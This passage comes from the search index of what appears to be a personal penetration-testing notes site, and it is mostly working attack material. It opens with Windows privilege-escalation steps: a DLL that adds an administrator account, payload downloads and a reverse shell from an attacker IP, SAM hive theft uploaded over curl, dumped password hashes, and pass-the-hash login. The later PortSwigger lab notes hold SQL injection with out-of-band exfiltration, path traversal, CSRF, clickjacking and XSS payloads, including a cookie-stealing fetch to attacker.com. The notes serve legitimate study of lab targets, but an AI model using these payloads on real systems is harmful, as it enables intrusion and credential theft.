to DLL module\nDWORD ul_reason_for_call,// Reason for calling function\nLPVOID lpReserved ) // Reserved\n{\n    switch ( ul_reason_for_call )\n    {\n        case DLL_PROCESS_ATTACH: // A process is loading the DLL.\n        int i;\n        i = system (\"net user dave3 password123! /add\");\n        i = system (\"net localgroup administrators dave3 /add\");\n        break;\n        case DLL_THREAD_ATTACH: // A process is creating a new thread.\n        break;\n        case DLL_THREAD_DETACH: // A thread exits normally.\n        break;\n        case DLL_PROCESS_DETACH: // A process unloads the DLL.\n        break;\n    }\n    return TRUE;\n}\n</code></pre> <pre><code>x86_64-w64-mingw32-gcc test.c --shared -o test.dll\n\niwr -uri http://192.168.45.241/test.dll -Outfile EnterpriseServiceOptional.dll\n\ncertutil.exe -f -urlcache http://192.168.45.241/test.dll EnterpriseServiceOptional.dll\n\niwr -uri http://192.168.45.241/rev.dll -Outfile EnterpriseServiceOptional.dll\n\ncertutil.exe -f -urlcache http://192.168.45.241/SigmaPotato.exe SigmaPotato.exe\n\ncertutil.exe -f -urlcache http://192.168.45.241/rev.exe rev.exe\n\n.\\SigmaPotato.exe --revshell 192.168.45.241 445\n\ncmd /c dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK\n\nc:\\Program Files\\Common Files\\System\nc:\\Program Files (x86)\\Common Files\\System\nc:\\ProgramData\\USOShared\\Logs\\System\nc:\\Users\\All Users\\USOShared\\Logs\\System\nc:\\Windows\\System\nc:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System\nc:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\nc:\\Windows\\diagnostics\\system\nc:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System\nc:\\Windows\\PLA\\System\nc:\\Windows\\SysWOW64\\LogFiles\\SAM\nc:\\Windows\\Vss\\Writers\\System\n</code></pre> <p>SeBackupPrivilege abuse</p> <pre><code># Create a temp directory:\nmkdir C:\\temp\n\n# Copy the sam and system hive of HKLM to C:\\temp and then download them.\nreg save hklm\\sam C:\\temp\\sam.hive\n\nreg save hklm\\system C:\\temp\\system.hive\n\n# Transfer to Kali\ncmd /c curl -F \"file=@sam.hive\" http://192.168.45.241:8081/upload\n\ncmd /c curl -F \"file=@system.hive\" http://192.168.45.241:8081/upload\n\n# Dump hash\n$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Target system bootKey: 0xb4999e49259682622dcc1e3a1636ff45\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:856f13362db36284f7d964120d794a98:::\nenterpriseadmin:1001:aad3b435b51404eeaad3b435b51404ee:d94267c350fc02154f2aff04d384b354:::\ndiana:1002:aad3b435b51404eeaad3b435b51404ee:3f2e7dddbe7a42d8978c1689b67297f3:::\nalex:1003:aad3b435b51404eeaad3b435b51404ee:821036ef8b6f43194779f6fca426f3f7:::\nenterpriseuser:1004:aad3b435b51404eeaad3b435b51404ee:b875ee792421982ebcfa8217340ef376:::\noffsec:1005:aad3b435b51404eeaad3b435b51404ee:d2ce08a1ee362158863d47d478b2622e:::\n[*] Cleaning up...\n\n$ evil-winrm -i 192.168.207.222 -u \"Administrator\" -H \"8f518eb35353d7a83d27e7fe457664e5\"\n</code></pre>"}, {"location": "Others/Job/", "title": "Job", "text": "<p>Hands-on experience in implementing firewalls with Palo Alto, Cisco ASA and Checkpoint (Security Policies, Remote Access VPNs and NAT).</p> <p>PCNSE certification required for the position.</p> <p>Demonstrated experience monitoring and maintaining network management &amp; security (PCNSE, ACE,CCNA, CCIE and CISSP certifications would be highly regarded)</p> <p>Knowledge of Palo Alto Next Generation Firewalls, SSL decryption, WildFire, Threat Prevention, URL filtering and Panorama Highly Regarded.</p> <p>Migration experience with Palo Alto, Cisco ASA/ISE/ACS, Checkpoint and Juniper SRX would be Advantageous.</p> <p>Advanced knowledge of LAN and WAN protocols such as RIP, EIGRP, OSPF, BGP, MPLS.</p> <p>Understanding of Global/Local load balancing devices including F5 (LTM, GTM, ASM), Cisco CSS would be advantageous.</p> <p>Experience working in 24x7 centres with complex, mission-critical, high transaction, high availability environments.</p> <p>Basic working knowledge of UNIX, Linux, Windows, SNMP, Microsoft Active Directory.</p> <p>Virtualisation capabilities would be highly advantageous (VMware).</p>"}, {"location": "Others/Job/#these-are-some-of-the-skills-you-might-be-able-to-showcase-provide-and-elaborate-on-in-an-interview", "title": "These are some of the skills you might be able to showcase, provide and elaborate on in an interview:", "text": "<p>GitHub account to showcase code.  Have you developed your own security tools?  Have you participated in any bug bounties on the\u202fHackerone or Bugcrowd platforms?  Have you published any vulnerabilities (extra points for CVEs assigned)?  Do you have a security blog that you regularly post on?  Have you ever participated in a Capture The Flag event?  Have you ever attended or presented at a security conference? </p>"}, {"location": "Others/NZISM%26PSR/", "title": "NZISM &amp; PSR", "text": "<p>The New Zealand Information Security Manual (NZISM) is an integral part of the Protective Security Requirements (PSR) framework which sets out the Aotearoa New Zealand Government's expectations for the management of personnel, information and physical security as directed by Cabinet.</p>"}, {"location": "Others/Use%20WSL%20to%20Install%20Ubuntu%20on%20Windows%2011/", "title": "Use WSL to Install Ubuntu on Windows 11", "text": ""}, {"location": "Others/Use%20WSL%20to%20Install%20Ubuntu%20on%20Windows%2011/#use-wsl-to-install-ubuntu-on-windows-11", "title": "Use WSL to Install Ubuntu on Windows 11", "text": "<ol> <li>Install WSL.<ul> <li>In the Windows Search bar, type \u201cturn Windows features on or off\u201d and then open the corresponding app.</li> <li>Scroll down to check the boxes in front of Virtual Machine Platform and Windows Subsystem for Linux. Then, click OK.</li> <li>Restart your computer when required. </li> </ul> </li> <li>Install ubuntu  <code>wsl --install -d ubuntu</code></li> </ol>"}, {"location": "PortSwigger%20Labs/Access%20control%20vulnerabilities/", "title": "Access control vulnerabilities", "text": "<p>Special HTTP headers | HackTricks</p> <pre><code># the back-end application is built on a framework that supports the X-Original-URL header\n\nX-Original-Url: /admin\nX-Original-Url: /admin/delete\n</code></pre> <p></p>"}, {"location": "PortSwigger%20Labs/Authentication/", "title": "Authentication", "text": ""}, {"location": "PortSwigger%20Labs/CORS/", "title": "Cross-origin resource sharing (CORS)", "text": "<p>CORS - Misconfigurations &amp; Bypass | Hacktricks</p> <pre><code>&lt;script&gt;\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);\n    req.withCredentials = true;\n    req.send();\n\n    function reqListener() {\n        location='/log?key='+this.responseText;\n    };\n&lt;/script&gt;\n</code></pre>"}, {"location": "PortSwigger%20Labs/CSRF/", "title": "Cross-site request forgery (CSRF)", "text": ""}, {"location": "PortSwigger%20Labs/CSRF/#lab-csrf-vulnerability-with-no-defenses", "title": "Lab: CSRF vulnerability with no defenses", "text": "<pre><code>&lt;form method=\"POST\" action=\"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\"&gt;\n    &lt;input type=\"hidden\" name=\"email\" value=\"anything@web-security-academy.net\"&gt;\n&lt;/form&gt;\n&lt;script&gt;\n        document.forms[0].submit();\n&lt;/script&gt;\n</code></pre>"}, {"location": "PortSwigger%20Labs/CSRF/#lab-clickjacking-with-form-input-data-prefilled-from-a-url-parameter", "title": "Lab: Clickjacking with form input data prefilled from a URL parameter", "text": "<pre><code>&lt;style&gt;\n    iframe {\n        position:relative;\n        width:700px;\n        height: 500px;\n        opacity: 0.1;\n        z-index: 2;\n    }\n    div {\n        position:absolute;\n        top:450px;\n        left:60px;\n        z-index: 1;\n    }\n&lt;/style&gt;\n&lt;div&gt;Click me&lt;/div&gt;\n&lt;iframe src=\"https://0a0700e40484434d81eb262a00f20067.web-security-academy.net/my-account?email=test123@test-website.com\"&gt;&lt;/iframe&gt;\n</code></pre>"}, {"location": "PortSwigger%20Labs/Clickjacking/", "title": "Click jacking", "text": ""}, {"location": "PortSwigger%20Labs/Clickjacking/#lab-basic-clickjacking-with-csrf-token-protection", "title": "Lab: Basic clickjacking with CSRF token protection", "text": "<pre><code>&lt;style&gt;\n    iframe {\n        position:relative;\n        width:700px;\n        height: 500px;\n        opacity: 0.1;\n        z-index: 2;\n    }\n    div {\n        position:absolute;\n        top:400px;\n        left:60px;\n        z-index: 1;\n    }\n&lt;/style&gt;\n&lt;div&gt;Click me&lt;/div&gt;\n&lt;iframe src=\"https://0a0700e40484434d81eb262a00f20067.web-security-academy.net/my-account\"&gt;&lt;/iframe&gt;\n</code></pre> <pre><code>&lt;style&gt;\n    iframe {\n        position:relative;\n        width:700px;\n        height: 500px;\n        opacity: 0.1;\n        z-index: 2;\n    }\n    div {\n        position:absolute;\n        top:410px;\n        left:80px;\n        z-index: 1;\n    }\n&lt;/style&gt;\n&lt;div&gt;Click me&lt;/div&gt;\n&lt;iframe\nsrc=\"https://0a7100ad033a81ce80eabd7200b10064.web-security-academy.net/feedback?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult\"&gt;&lt;/iframe&gt;\n</code></pre> <pre><code>&lt;!-- victim script --&gt;\n&lt;!-- Ads to be inserted here --&gt;\n    &lt;div id='ads'&gt;\n    &lt;/div&gt;\n    &lt;script&gt;\n        window.addEventListener('message', function(e) {\n            document.getElementById('ads').innerHTML = e.data;\n        })\n    &lt;/script&gt;\n\n&lt;!-- exploit server --&gt;\n&lt;iframe src=\"https://0a4e00fd03dfaaf680db26b300e00060.web-security-academy.net/\" onload=\"this.contentWindow.postMessage('&lt;img src=1 onerror=print()&gt;','*')\"&gt;\n</code></pre>"}, {"location": "PortSwigger%20Labs/File%20upload%20vulnerabilities/", "title": "File upload vulnerabilities", "text": "<pre><code>image/jpeg\nimage/png\napplication/x-php\n</code></pre>"}, {"location": "PortSwigger%20Labs/GraphQL%20API%20vulnerabilities/", "title": "GraphQL API vulnerabilities", "text": "<p>GraphQL | HackTricks</p> <p>GraphQL is an API query language that is designed to facilitate efficient communication between clients and servers. It enables the user to specify exactly what data they want in the response, helping to avoid the large response objects and multiple calls that can sometimes be seen with REST APIs.</p> <p>View every post, and get the request url:</p> <p></p>"}, {"location": "PortSwigger%20Labs/HTTP%20Host%20header%20attacks/", "title": "HTTP Host header attacks", "text": ""}, {"location": "PortSwigger%20Labs/Information%20disclosure/", "title": "Information disclosure", "text": ""}, {"location": "PortSwigger%20Labs/Information%20disclosure/#lab-information-disclosure-in-version-control-history", "title": "Lab: Information disclosure in version control history", "text": "<pre><code>$ wget -r https://0ac800470435398281b21bbf000a0001.web-security-academy.net/.git \n\n$ git-cola\n</code></pre>"}, {"location": "PortSwigger%20Labs/Insecure%20deserialization/", "title": "Insecure deserialization", "text": "<pre><code>O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"kseao410ayd7ok9g46wy5gtml15a0p2e\";}\n\n# the number is the lenght of the value, when the value is null or 0, then use i:0\nO:4:\"User\":2:{s:8:\"username\";s:13:\"administrator\";s:12:\"access_token\";i:0;}\n\n</code></pre> <p>You can sometimes read source code by appending a <code>tilde (~)</code> to a filename to retrieve an editor-generated backup file. </p>"}, {"location": "PortSwigger%20Labs/JWT/", "title": "JWT (Json Web Tokens)", "text": "<p>Json stands for JavaScript Object Notation</p>"}, {"location": "PortSwigger%20Labs/NoSQL%20injection/", "title": "NoSQL injection", "text": "<p>NoSQL injection | HackTricks</p>"}, {"location": "PortSwigger%20Labs/NoSQL%20injection/#lab-exploiting-nosql-operator-injection-to-bypass-authentication", "title": "Lab: Exploiting NoSQL operator injection to bypass authentication", "text": "<pre><code>{\n    \"username\":{\n        \"$regex\":\"admin.*\"\n        },\n    \"password\":{\n        \"$ne\":\"\"\n        }\n    }\n</code></pre>"}, {"location": "PortSwigger%20Labs/OAuth%20authentication/", "title": "OAuth authentication", "text": ""}, {"location": "PortSwigger%20Labs/OS%20command%20injection/", "title": "OS command injection", "text": "<p>Command Injection | HackTricks</p> <pre><code>email=||whoami&gt;/var/www/images/output.txt||\n\n\n</code></pre>"}, {"location": "PortSwigger%20Labs/Path%20traversal/", "title": "Path traversal", "text": "<pre><code># /etc/passwd\nGET /image?filename=%2fetc%2fpasswd\n\n# The application strips path traversal sequences from the user-supplied filename before using it.\n# ....//....//....//etc/passwd\n# after the application strips path traversal sequences, the request becomes to ../../../etc/passwd\nGET /image?filename=....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd\n\n# url-encoded twicely\nGET /image?\n# ../../../etc/passwd\nfilename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34\n\n# validation of start of path\nGET /image?filename=/var/www/images/../../../etc/passwd\n\n# validation of file extension with null byte (%00) bypass\nGET /image?filename=..%2f..%2f..%2fetc%2fpasswd%00.png\n</code></pre>"}, {"location": "PortSwigger%20Labs/Race%20conditions/", "title": "Race conditions", "text": ""}, {"location": "PortSwigger%20Labs/Race%20conditions/#lab-limit-overrun-race-conditions", "title": "Lab: Limit overrun race conditions", "text": "<pre><code>#!/bin/python\nimport requests;\nfrom threading import Thread;\n\ndef session_concurrency():\n    header={\n        \"Content-Type\": \"application/x-www-form-urlencoded\",\n        \"Cookie\": \"session=T87ijioANp5FKgiSGz2crrXsHKSblFwH\",\n        \"Connection\": \"keep-alive\"\n    }\n\n    data=\"csrf=GcfEh08lO21x2QArtkTcH0ARVaHRfEpY&amp;coupon=PROMO20\"\n\n    returndata = requests.post(url=\"https://0adf00490368d39980513ad700f6009c.web-security-academy.net/cart/coupon\", headers=header, data=data)\n    print(returndata)\n\nif __name__ == \"__main__\":\n    for x in range(30):\n        thread = Thread(target=session_concurrency)\n</code></pre> <p>Use the script, got two cupons applied at the same time. Try to bundle 12 requests in Repeater as a group, and send them parallelly.</p>"}, {"location": "PortSwigger%20Labs/SQL%20injection/", "title": "SQL injection", "text": "<p>SQL injection cheat sheet | PortSwigger</p> <p>Labs worth to try different solutions:</p> <p>Lab: Blind SQL injection with conditional responses</p> <p>Note: Determine the number of columns that are being returned by the query. <code>'+UNION+SELECT+null,null,null+--</code></p> <p>Syntax of <code>substr</code> in Oracle and <code>substring</code> in MySql:</p> <p><code>substr(obj, start, length)</code></p> <p><code>CAST(expression AS datatype)</code></p>"}, {"location": "PortSwigger%20Labs/SQL%20injection/#mysql", "title": "MySQL", "text": "<pre><code># When output is strings, and the output has two columns\n'+UNION+SELECT+'abc','def'+--+-\n' UNION SELECT 'abc','def' -- -\n\n'+UNION+SELECT+1,2+--+-\n' UNION SELECT 1,2 -- -\n\n# show schema (result: pg_catalog, public)\n' UNION SELECT schema_name,null from information_schema.schemata -- -\n\n# show tables (result: users_lrnvvh, products)\n' UNION SELECT table_name,null from information_schema.tables where table_schema='public'-- -\n\n# show columns (result: username_mqypon, email, password_yafwrb)\n' union select column_name,null from information_schema.columns where table_name='users_lrnvvh' --\n\n# show content of the columns\n' union select username_mqypon, password_yafwrb from users_lrnvvh --\n\n# results:\n&lt;th&gt;wiener&lt;/th&gt;\n&lt;td&gt;lcw9jq5ddm0w6khq4yny&lt;/td&gt;\n&lt;th&gt;administrator&lt;/th&gt;\n&lt;td&gt;syakr1r6zzdoyucbbt3p&lt;/td&gt;\n</code></pre> <p>Blind Sql injection</p> <pre><code># verify if table users exists\nTrackingId=AR4Id4NOsDWKgZr5' and (select 1 from users limit 1)=1 --\n# OR\nTrackingId=AR4Id4NOsDWKgZr5' AND (SELECT 'a' FROM users LIMIT 1)='a\n\n# seek the length of password, the length is 20\nTrackingId=AR4Id4NOsDWKgZr5' AND (SELECT 1 FROM users WHERE username='administrator' AND LENGTH(password)&gt;2)=1 --\n\n# find the first char of the password in BurpSuite Intruder\n# wordlist is 0-9 and a-z\nTrackingId=AR4Id4NOsDWKgZr5' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='\u00a7a\u00a7;\n\n# find the second char of the password in BurpSuite Intruder\nTrackingId=AR4Id4NOsDWKgZr5' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='\u00a7a\u00a7;\n....\n# Result\n9t4y6d9d990py759cj4g\n</code></pre> <p>CAST func error-based Sqli</p> <pre><code>TrackingId=yhTBJKBUnbrE987b' AND 1=CAST((SELECT username FROM users) AS int)--\n\n# change to\n\nTrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--\n\nTrackingId=' AND 1=CAST((SELECT password FROM users limit 1) AS int)--\n\n&lt;h4&gt;ERROR: invalid input syntax for type integer: \"89p5bcodusbr9fnbivol\"&lt;/h4&gt;\n&lt;p class=is-warning&gt;ERROR: invalid input syntax for type integer: \"89p5bcodusbr9fnbivol\"&lt;/p&gt;\n</code></pre> <p> </p> <p>Blind SQL injection with time delays</p> <pre><code># PostgreSql\nTrackingId=hPkhOrySFQ85FpIa'||pg_sleep(10) --\n\nTrackingId=hPkhOrySFQ85FpIa'||select case when (username='administrator') then pg_sleep(10) else pg_sleep(0) end from users --\n\n# %3B is ;\nTrackingId=hPkhOrySFQ85FpIa'%3Bselect case when (username='administrator' and length(password)&gt;3) then pg_sleep(10) else pg_sleep(0) end from users --\n\n\nTrackingId=hPkhOrySFQ85FpIa'%3Bselect case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(0) end from users --\n\n# For this process to be as reliable as possible in BurpSuite Intruder, you need to configure the Intruder attack to issue requests in a single thread. To do this, go to the \"Resource pool\" tab and add the attack to a resource pool with the \"Maximum concurrent requests\" set to 1. \n\n# position 1: 1-20\n# position 2: 0-9;a-z\nTrackingId=hPkhOrySFQ85FpIa'%3Bselect case when (username='administrator' and substring(password,\u00a71\u00a7,1)='\u00a7a\u00a7') then pg_sleep(10) else pg_sleep(0) end from users --\n\n# Results:\nkpogkd2oobo6qn6ah9t0\n</code></pre>"}, {"location": "PortSwigger%20Labs/SQL%20injection/#oracle", "title": "Oracle", "text": "<pre><code># When output is strings, and the output has two columns\n'+UNION+SELECT+'abc','def'+from+dual+--+-\n' UNION SELECT 'abc','def' from dual -- -\n\n'+UNION+SELECT+1,2+from+dual+--+-\n' UNION SELECT 1,2 from dual -- -\n\n# List tables\n' UNION SELECT table_name,NULL FROM all_tables --\n\n# List columns names in table\n' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_MAFRVO'--\n'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_MAFRVO'--\n\n# List credentials\n' UNION SELECT PASSWORD_LIKLQH,USERNAME_BWWGIJ FROM USERS_MAFRVO --\n\n# Results\n&lt;th&gt;9jddzr1p7b0sn05e9g9f&lt;/th&gt;\n&lt;td&gt;carlos&lt;/td&gt;\n&lt;th&gt;xas8edrgbt2bhhohdfi9&lt;/th&gt;\n&lt;td&gt;wiener&lt;/td&gt;\n&lt;th&gt;ya6oioucvyxx27b74hjo&lt;/th&gt;\n&lt;td&gt;administrator&lt;/td&gt;\n</code></pre> <p>Blind Sql injection</p> <pre><code># verify if table users exists\nTrackingId=3xqush3htRbBpJGL'||(select '' from users where rownum=1)||'\n\n# 500 Internal Server Error, an error is received when the condition is true\nTrackingId=3xqush3htRbBpJGL'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'\n\n# 200 OK\nTrackingId=3xqush3htRbBpJGL'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'\n\n# check whether the username administrator exists\nTrackingId=3xqush3htRbBpJGL'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'\n\n# seek the length of password, the length is 20\nTrackingId=3xqush3htRbBpJGL'||(SELECT CASE WHEN LENGTH(password)&gt;20 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'\n\n# find the first char of the password in BurpSuite Intruder\n# wordlist is 0-9 and a-z\nTrackingId=3xqush3htRbBpJGL'||(SELECT CASE WHEN SUBSTR(password,\u00a71\u00a7,1)='\u00a7a\u00a7' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'\n\n....\n# Result\nxrrttoce7r3macl8ykml\n</code></pre>"}, {"location": "PortSwigger%20Labs/SQL%20injection/#blind-sql-injection-with-out-of-band-interaction", "title": "Blind SQL injection with out of band interaction", "text": "<pre><code>-- Oracle database DNS lookup with data exfiltration\nSELECT EXTRACTVALUE(xmltype('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"&gt; %remote;]&gt;'),'/l') FROM dual\n\nTrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAI\"&gt; %remote;]&gt;'),'/l') FROM dual--\n\nx'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLABORATOR-SUBDOMAIN/\"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--\n</code></pre>"}, {"location": "PortSwigger%20Labs/SQL%20injection/#blind-sql-injection-with-out-of-band-data-exfiltration", "title": "Blind SQL injection with out-of-band data exfiltration", "text": "<pre><code>-- Oracle database DNS lookup with data exfiltration\nSELECT EXTRACTVALUE(xmltype('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM \"http://'||(SELECT password from users when username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/\"&gt; %remote;]&gt;'),'/l') FROM dual--\n\nTrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM \"http://'||(SELECT password from users when username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/\"&gt; %remote;]&gt;'),'/l') FROM dual--\n\nTrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+from+users+where+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/\"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--\n</code></pre>"}, {"location": "PortSwigger%20Labs/SQL%20injection/#sql-injection-with-filter-bypass-via-xml-encoding", "title": "SQL injection with filter bypass via XML encoding", "text": "<p>Bypass the WAF</p> <ol> <li> <p>As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select <code>Extensions &gt; Hackvertor &gt; Encode &gt; dec_entities/hex_entities</code>.</p> </li> <li> <p>Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.</p> </li> </ol> <p>Craft an exploit</p> <ol> <li> <p>Pick up where you left off, and deduce that the query returns a single column. When you try to return more than one column, the application returns 0 units, implying an error.</p> </li> <li> <p>As you can only return one column, you need to concatenate the returned usernames and passwords, for example:</p> </li> </ol> <pre><code>&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT username || '~' || password FROM users&lt;/@hex_entities&gt;&lt;/storeId&gt;\n\n&lt;storeId&gt; &lt;@hex_entities&gt;1 UNION Select username || '~' || password FROM users--&lt;/@hex_entities&gt;&lt;/storeId&gt;\n</code></pre> <ol> <li>Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a <code>~</code> character.</li> </ol> <p></p>"}, {"location": "PortSwigger%20Labs/SSRF/", "title": "Server-side request forgery (SSRF)", "text": ""}, {"location": "PortSwigger%20Labs/Web%20LLM%20attacks/", "title": "Web LLM (Large Language Model) attacks", "text": ""}, {"location": "PortSwigger%20Labs/Web%20cache%20poisoning/", "title": "Web cache poisoning", "text": ""}, {"location": "PortSwigger%20Labs/WebSockets/", "title": "WebSockets", "text": ""}, {"location": "PortSwigger%20Labs/XSS/", "title": "Cross-site script (XSS)", "text": "<p>Cross-site scripting (XSS) cheat sheet | PortSwigger</p>"}, {"location": "PortSwigger%20Labs/XSS/#when-and-where-to-test-xss", "title": "When and where to test XSS\uff1f", "text": "<ol> <li> <p>URL pattern likes <code>/?search=xxxx</code> <code>https://example.com/?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></p> </li> <li> <p>All input areas</p> </li> </ol>"}, {"location": "PortSwigger%20Labs/XSS/#the-significant-effects-xxs-can-cause", "title": "The significant effects XXS can cause", "text": "<p>Session Hijacking and Credential Theft</p> <pre><code>&lt;script&gt;\nfetch('http://attacker.com/steal?cookie=' + document.cookie);\n&lt;/script&gt;\n</code></pre> <p>The attacker receives the session token and uses it to impersonate the victim by including the stolen cookie in their HTTP requests to the web application.</p> <p>Unauthorized Access: The attacker gains access to the victim\u2019s account, potentially viewing sensitive information, performing transactions, or changing account settings.</p>"}, {"location": "PortSwigger%20Labs/XSS/#sample-xss-commands-to-check", "title": "Sample XSS commands to check", "text": "<pre><code>\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n\"&gt;&lt;img src=x onerror=alert(1) &gt;\n\"&gt;&lt;svg onload=alert('XSS')&gt;\n</code></pre>"}, {"location": "PortSwigger%20Labs/XSS/#payloads", "title": "payloads", "text": "<pre><code>/product?productId=1&amp;storeId=\"&gt;&lt;/select&gt;&lt;img%20src=1%20onerror=alert(1)&gt;\n\n// AngularJS expression \n{{$on.constructor('alert(1)')()}}\n{{constructor.constructor('alert(1)')()}}\n\n// Reflected DOM XSS\n// {\"searchTerm\":\"\\\\\"-alert(1)}//\", \"results\":[]}\n\\\"-alert(1)}//\n\n// replace() bypass\n&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;\n\n//?search=\"&gt;&lt;body onresize=print()&gt;\" onload=this.style.width='100px'&gt;\n&lt;iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'&gt;\n\n// ?search=&lt;xss id=x onfocus=alert(document.cookie) tabindex=1&gt;#x';\n&lt;script&gt;\nlocation = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';\n&lt;/script&gt;\n\n// ?search=\"&gt;&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;\nhttps://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E\n\n// /?'accesskey='x'onclick='alert(1)\nhttps://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)\n\nTo trigger the exploit on yourself, press one of the following key combinations:\n\n    On Windows: ALT+SHIFT+X\n    On MacOS: CTRL+ALT+X\n    On Linux: Alt+X\n</code></pre> <pre><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n\\'-alert(1)//\nhttp://foo?'-alert(1)-'\nhttp://foo?&amp;apos;-alert(1)-&amp;apos;\n${alert(1)}\n${4*4}\n</code></pre> <pre><code>&lt;script&gt;\nvar req = new XMLHttpRequest();\nreq.onload = handleResponse;\nreq.open('get','/my-account',true);\nreq.send();\nfunction handleResponse() {\n    var token = this.responseText.match(/name=\"csrf\" value=\"(\\w+)\"/)[1];\n    var changeReq = new XMLHttpRequest();\n    changeReq.open('post', '/my-account/change-email', true);\n    changeReq.send('csrf='+token+'&amp;email=test@test.com')\n};\n&lt;/script&gt;\n</code></pre>"}, {"location": "PortSwigger%20Labs/XSS/#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch", "title": "Lab: DOM XSS in document.write sink using source location.search", "text": "<pre><code>&lt;script&gt;\n    function trackSearch(query) {\n        document.write('&lt;img src=\"/resources/images/tracker.gif?searchTerms='+query+'\"&gt;');\n    }\n    var query = (new URLSearchParams(window.location.search)).get('search');\n    if(query) {\n        trackSearch(query);\n    }\n&lt;/script&gt;\n</code></pre> <p>Solution:</p> <p>Break out of the <code>img</code> attribute by searching for: <code>\"&gt;&lt;svg onload=alert(1)&gt;</code></p>"}, {"location": "PortSwigger%20Labs/XSS/#lab-dom-xss-in-innerhtml-sink-using-source-locationsearch", "title": "Lab: DOM XSS in innerHTML sink using source location.search", "text": "<pre><code>&lt;script&gt;\n    function doSearchQuery(query) {\n        document.getElementById('searchMessage').innerHTML = query;\n    }\n    var query = (new URLSearchParams(window.location.search)).get('search');\n    if(query) {\n        doSearchQuery(query);\n    }\n&lt;/script&gt;\n</code></pre> <p>Solution:</p> <p>Enter the following into the into the search box: <code>&lt;img src=1 onerror=alert(1)/&gt;</code></p>"}, {"location": "PortSwigger%20Labs/XSS/#lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded", "title": "Lab: Reflected XSS into attribute with angle brackets HTML-encoded", "text": 